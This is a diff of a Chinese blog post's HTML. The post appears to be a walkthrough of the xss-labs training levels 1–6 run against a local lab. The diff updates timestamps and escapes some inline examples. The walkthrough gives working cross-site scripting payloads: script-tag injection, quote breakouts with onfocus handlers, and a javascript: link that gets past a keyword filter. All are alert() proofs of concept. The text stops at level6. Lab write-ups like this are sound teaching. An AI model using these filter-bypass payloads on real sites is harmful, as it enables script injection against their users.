@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251125201332.png">
 <meta property="og:image" content="https://luomubing-lin.github.io/blog/images/Pasted_image_20251125204219.png">
 <meta property="article:published_time" content="2025-11-26T15:33:10.000Z">
-<meta property="article:modified_time" content="2025-11-26T15:41:04.505Z">
+<meta property="article:modified_time" content="2025-11-26T15:44:41.407Z">
 <meta property="article:author" content="mul1n">
 <meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary">
@@ -219,7 +219,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2025-11-26 23:33:10 / Modified: 23:41:04" itemprop="dateCreated datePublished" datetime="2025-11-26T23:33:10+08:00">2025-11-26</time>
+      <time title="Created: 2025-11-26 23:33:10 / Modified: 23:44:41" itemprop="dateCreated datePublished" datetime="2025-11-26T23:33:10+08:00">2025-11-26</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -244,11 +244,11 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;欢迎用户test&lt;/h2&gt;&lt;center&gt;&lt;img src=[level1.png](view-source:http://127.0.0.1/xss-labs/level1.png)&gt;&lt;/center&gt; </span><br><span class="line">&lt;h3 align=center&gt;payload的长度:4&lt;/h3&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
 <p>test直接被带入html标签中，传入<code>&lt;h1&gt;1&lt;/h1&gt;</code> 测试成功显示标题1<br><code>payload: ?name=&lt;script&gt;alert(0);&lt;/script&gt;</code></p>
 <h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=[level2.php](view-source:http://127.0.0.1/xss-labs/level2.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;&gt; </span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br></pre></td></tr></table></figure>
-<p>传入<script>alert(1);</script>后发现被带入到input标签，并且没有转义<br>所以构造<br><code>payload:&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
+<p>传入<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>后发现被带入到input标签，并且没有转义<br>所以构造<br><code>payload:&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
 <h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;没有找到和1相关的结果.&lt;/h2&gt;&lt;center&gt; </span><br><span class="line">&lt;form action=[level3.php](view-source:http://127.0.0.1/xss-labs/level3.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&#x27;1&#x27;&gt; &lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
-<p>发现闭合为单引号<br>尝试：## ‘&gt;<script>alert(1);</script><br><code>&lt;input name=keyword value=&#39;&#39;&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&#39;&gt;</code><br>发现被&lt;,&gt;被转义<br>于是使用触发器onfocus,onmouseover,onclick<br>构造<code>payload: &#39; onfocus=javascript:alert(1) &#39;</code></p>
+<p>发现闭合为单引号<br>尝试：<code>&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code><br><code>&lt;input name=keyword value=&#39;&#39;&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&#39;&gt;</code><br>发现被&lt;,&gt;被转义<br>于是使用触发器onfocus,onmouseover,onclick<br>构造<code>payload: &#39; onfocus=javascript:alert(1) &#39;</code></p>
 <h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>与level3类似，”改为’即可</p>
-<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>查看源码发现是使用双引号闭合，尝试上传：”&gt;<script>alert(0);</script></p>
+<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>查看源码发现是使用双引号闭合，尝试上传：<code>&quot;&gt;&lt;script&gt;alert(0);&lt;/script&gt;</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt; </span><br><span class="line">&lt;h2 align=center&gt;没有找到和&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; </span><br><span class="line">&lt;form action=[level5.php](view-source:http://127.0.0.1/xss-labs/level5.php) method=GET&gt; </span><br><span class="line">&lt;input name=keyword value=&quot;&quot;&gt;&lt;scr_ipt&gt;alert(1);&lt;/script&gt;&quot;&gt; </span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure>
 <p>发现传入的<code>&lt;script&gt;</code>被转换为了<code>&lt;scr_ipt&gt;</code>导致标签失去作用<br>传on也同样出现被转换为o_n的情况<br>也就是上述的两种办法都不行<br>&#x3D;&#x3D;但是可以利用 JavaScript 的 URI&#x3D;&#x3D;<br><code>payload: ?keyword=&quot;&gt; &lt;a href=javascript:alert(1)&gt;hack&lt;/a&gt;</code><br><img src="/blog/images/Pasted_image_20251125181506.png"><br>点击hack即可</p>
 <h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>这题的href会被替换成hr_ef<br>但是经过测试发现，这道题对敏感词区分大小写的过滤，所以使用<br>payload:</p>
